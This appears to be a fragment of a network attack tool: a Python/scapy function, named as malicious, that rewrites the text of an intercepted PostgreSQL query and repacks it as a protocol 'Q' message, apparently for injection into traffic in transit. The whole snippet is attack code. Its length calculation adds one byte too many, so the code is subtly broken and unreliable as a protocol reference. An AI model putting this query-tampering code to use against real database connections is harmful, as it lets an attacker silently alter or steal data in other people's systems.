from scapy.all import *

def craft_malicious_psql_query(original_sql: str, replacement_text: str, target_text: str) -> bytes:

    modified_sql = original_sql.replace(target_text, replacement_text)
    print(f"DEBUG: SQL modificado: {modified_sql}")
    modified_sql_bytes = modified_sql.encode('utf-8')
    new_length = len(modified_sql_bytes) + 1 + 4 + 1 
    length_bytes = new_length.to_bytes(4, 'big')
    new_psql_payload = b'Q' + length_bytes + modified_sql_bytes + b'\x00'
    return new_psql_payload
